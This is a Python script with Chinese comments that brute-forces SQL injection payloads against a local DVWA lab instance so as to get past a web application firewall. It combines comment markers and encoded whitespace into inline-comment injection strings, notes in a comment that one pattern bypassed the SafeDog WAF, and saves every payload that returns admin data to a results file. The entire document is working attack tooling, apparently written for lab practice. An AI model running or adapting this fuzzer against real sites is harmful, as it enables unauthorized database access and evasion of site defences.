# import requests
# cookies = ""
# url = 'http://127.0.0.1/dvwa/vulnerabilities/sqli'
# headers = {
#     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84Safari/537.3",
#     "Cookie":"PHPSESSID=e3hkhvlj4dfd7p7mrnoqt97vc5;security=low"
# }
# # 循环fuzz 
# for i in range(10000,15000):
#    reture =  url+"/?id=1%27%2F*%21" + str(i) + "and*%2F+%27a%27%3D%27a+--%2B&Submit=Submit" 
#    r = requests.get(reture,headers=headers).text
#    key = "攻击请求"
#    ss = r.find(key)
#    if ss == -1:
#         print("fuzz is ok! url is:")
#         print(reture)

import requests
import sys
 
fuzz_zs = ['/*','*/','/*!','/**/','?','/','*','=','`','!','%','_','-','+']
fuzz_sz = ['']
fuzz_ch = ["%09","%0a","%0b","%0c","%0d","%20","%a0"]

fuzz = fuzz_zs+fuzz_ch+fuzz_sz
headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36",
    "Cookie": "security=low; PHPSESSID=e3hkhvlj4dfd7p7mrnoqt97vc5"
}
url_start = "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1"
#需要测试的Payload总数量 
len = len(fuzz)**3
num = 0
#三层嵌套组合，也可增加为4、5、6层……
for a in fuzz:
    for b in fuzz:
        for c in fuzz:
            num += 1
            #payload = "'/*!union"+a+b+c+"select*/1,2#"
            #payload = "'/**//*!*/AND/*!*/"+a+b+c+"/**/order/**/by/**/1--+"
            #成功绕过安全狗
            payload = "'/**//*!*/and/*!*/"+a+b+c+"/**/'1'='1"
            url = url_start + payload+"&Submit=Submit#"
            sys.stdout.write(' '*30 +'\r')
            sys.stdout.flush()
            print("Now URL:"+url)
            sys.stdout.write("完成进度:%s/%s \r" %(num,len))
            sys.stdout.flush()
            res = requests.get(url = url,headers = headers)
            if "First name: admin" in res.text:
                print("\033[0;33m[*]Find BypassWAF Payload:\033[0m"+url)         
                with open ("Results.txt",'a') as r:
                    r.write(url+"\n")      